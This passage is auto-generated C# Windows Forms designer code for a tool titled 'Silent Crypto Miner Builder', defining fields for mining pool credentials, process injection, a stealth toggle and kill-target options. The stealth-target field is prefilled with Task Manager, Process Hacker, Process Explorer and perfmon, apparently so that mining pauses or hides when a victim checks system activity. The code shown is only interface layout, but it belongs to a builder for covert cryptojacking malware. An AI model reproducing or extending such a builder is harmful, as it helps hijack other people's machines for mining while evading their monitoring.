            this.label19.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label19.Name = "label19";
            this.label19.Size = new System.Drawing.Size(75, 17);
            this.label19.TabIndex = 137;
            this.label19.Text = "Kill Targets:";
            // 
            // txtKillTargets
            // 
            this.txtKillTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtKillTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtKillTargets.Location = new System.Drawing.Point(14, 151);
            this.txtKillTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtKillTargets.MaxLength = 32767;
            this.txtKillTargets.MultiLine = false;
            this.txtKillTargets.Name = "txtKillTargets";
            this.txtKillTargets.Size = new System.Drawing.Size(142, 24);
            this.txtKillTargets.TabIndex = 136;
            this.txtKillTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtKillTargets.UseSystemPasswordChar = false;
            this.txtKillTargets.WordWrap = false;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.ForeColor = System.Drawing.Color.Gray;
            this.label1.Location = new System.Drawing.Point(13, 88);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(97, 17);
            this.label1.TabIndex = 135;
            this.label1.Text = "Stealth Targets:";
            // 
            // txtStealthTargets
            // 
            this.txtStealthTargets.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStealthTargets.ForeColor = System.Drawing.Color.Silver;
            this.txtStealthTargets.Location = new System.Drawing.Point(14, 107);
            this.txtStealthTargets.Margin = new System.Windows.Forms.Padding(2);
            this.txtStealthTargets.MaxLength = 32767;
            this.txtStealthTargets.MultiLine = false;
            this.txtStealthTargets.Name = "txtStealthTargets";
            this.txtStealthTargets.Size = new System.Drawing.Size(142, 24);
            this.txtStealthTargets.TabIndex = 134;
            this.txtStealthTargets.Text = "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe";
            this.txtStealthTargets.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStealthTargets.UseSystemPasswordChar = false;
            this.txtStealthTargets.WordWrap = false;
            // 
            // chkAdvParam
            // 
            this.chkAdvParam.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAdvParam.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvParam.Checked = false;
            this.chkAdvParam.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAdvParam.ForeColor = System.Drawing.Color.Black;
            this.chkAdvParam.Location = new System.Drawing.Point(228, 68);
            this.chkAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.chkAdvParam.Name = "chkAdvParam";
            this.chkAdvParam.Size = new System.Drawing.Size(178, 24);
            this.chkAdvParam.TabIndex = 131;
            this.chkAdvParam.Text = "Advanced Parameters";
            this.chkAdvParam.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAdvParam_CheckedChanged);
            // 
            // txtAdvParam
            // 
            this.txtAdvParam.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAdvParam.Enabled = false;
            this.txtAdvParam.ForeColor = System.Drawing.Color.Silver;
            this.txtAdvParam.Location = new System.Drawing.Point(228, 96);
            this.txtAdvParam.Margin = new System.Windows.Forms.Padding(2);
            this.txtAdvParam.MaxLength = 32767;
            this.txtAdvParam.MultiLine = false;
            this.txtAdvParam.Name = "txtAdvParam";
            this.txtAdvParam.Size = new System.Drawing.Size(178, 24);
            this.txtAdvParam.TabIndex = 130;
            this.txtAdvParam.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAdvParam.UseSystemPasswordChar = false;
            this.txtAdvParam.WordWrap = false;
            // 
            // chkRemoteConfig
            // 
            this.chkRemoteConfig.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkRemoteConfig.BackColor = System.Drawing.Color.Transparent;
            this.chkRemoteConfig.Checked = false;
            this.chkRemoteConfig.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkRemoteConfig.ForeColor = System.Drawing.Color.Black;
            this.chkRemoteConfig.Location = new System.Drawing.Point(228, 12);
            this.chkRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.chkRemoteConfig.Name = "chkRemoteConfig";
            this.chkRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.chkRemoteConfig.TabIndex = 133;
            this.chkRemoteConfig.Text = "Remote Configuration";
            this.chkRemoteConfig.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkRemoteConfig_CheckedChanged);
            // 
            // txtRemoteConfig
            // 
            this.txtRemoteConfig.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtRemoteConfig.Enabled = false;
            this.txtRemoteConfig.ForeColor = System.Drawing.Color.Silver;
            this.txtRemoteConfig.Location = new System.Drawing.Point(228, 40);
            this.txtRemoteConfig.Margin = new System.Windows.Forms.Padding(2);
            this.txtRemoteConfig.MaxLength = 32767;
            this.txtRemoteConfig.MultiLine = false;
            this.txtRemoteConfig.Name = "txtRemoteConfig";
            this.txtRemoteConfig.Size = new System.Drawing.Size(178, 24);
            this.txtRemoteConfig.TabIndex = 132;
            this.txtRemoteConfig.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtRemoteConfig.UseSystemPasswordChar = false;
            this.txtRemoteConfig.WordWrap = false;
            // 
            // tabJSON
            // 
            this.tabJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabJSON.Controls.Add(this.txtJSON);
            this.tabJSON.Location = new System.Drawing.Point(89, 4);
            this.tabJSON.Name = "tabJSON";
            this.tabJSON.Size = new System.Drawing.Size(418, 189);
            this.tabJSON.TabIndex = 7;
            this.tabJSON.Text = "JSON";
            // 
            // txtJSON
            // 
            this.txtJSON.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtJSON.ForeColor = System.Drawing.Color.Silver;
            this.txtJSON.Location = new System.Drawing.Point(3, 3);
            this.txtJSON.MaxLength = 32767;
            this.txtJSON.MultiLine = true;
            this.txtJSON.Name = "txtJSON";
            this.txtJSON.Size = new System.Drawing.Size(412, 183);
            this.txtJSON.TabIndex = 0;
            this.txtJSON.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtJSON.UseSystemPasswordChar = false;
            this.txtJSON.WordWrap = false;
            // 
            // MinerETH
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formMinerETH);
            this.Font = new System.Drawing.Font("Segoe UI", 8.59375F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "MinerETH";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.MinerETH_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formMinerETH.ResumeLayout(false);
            this.tabcontrolMinerETH.ResumeLayout(false);
            this.tabConnection.ResumeLayout(false);
            this.groupOptional.ResumeLayout(false);
            this.groupOptional.PerformLayout();
            this.groupRequired.ResumeLayout(false);
            this.groupRequired.PerformLayout();
            this.tabMining.ResumeLayout(false);
            this.tabMining.PerformLayout();
            this.tabAdvanced.ResumeLayout(false);
            this.tabAdvanced.PerformLayout();
            this.tabJSON.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        internal MephTheme formMinerETH;
        internal System.ComponentModel.BackgroundWorker BackgroundWorker2;
        internal Label Label8;
        internal MephTextBox txtPoolURL;
        internal Label Label7;
        internal MephTextBox txtPoolPassowrd;
        internal Label Label6;
        internal MephTextBox txtPoolUsername;
        internal MephTabcontrol tabcontrolMinerETH;
        internal TabPage tabConnection;
        internal TabPage tabMining;
        internal Label Label11;
        internal Label Label24;
        internal Label Label23;
        internal MephTextBox txtIdleWait;
        internal Label Label27;
        internal MephToggleSwitch toggleStealth;
        internal Label Label3;
        internal MephComboBox comboPoolScheme;
        internal Label Label12;
        internal MephTextBox txtPoolData;
        internal Label Label5;
        internal MephComboBox comboInjection;
        internal MephGroupBox groupOptional;
        internal Label Label14;
        internal MephTextBox txtPoolWorker;
        internal MephGroupBox groupRequired;
        internal MephComboBox comboIdleGPU;
        internal MephComboBox comboMaxGPU;
        internal Label Label22;
        internal Label Label16;
        internal TabPage tabAdvanced;
        internal MephToggleSwitch toggleIdle;
        internal Label label29;
        internal MephComboBox comboAlgorithm;
        internal MephCheckBox chkAPI;
        internal MephTextBox txtAPI;
        internal Label label19;
        internal MephTextBox txtKillTargets;
        internal Label label1;
        internal MephTextBox txtStealthTargets;
        internal MephCheckBox chkAdvParam;
        internal MephTextBox txtAdvParam;
        internal MephCheckBox chkRemoteConfig;
        internal MephTextBox txtRemoteConfig;
        private TabPage tabJSON;
        private MephTextBox txtJSON;
        internal Label label32;
        internal MephToggleSwitch toggleProcessKiller;
    }
}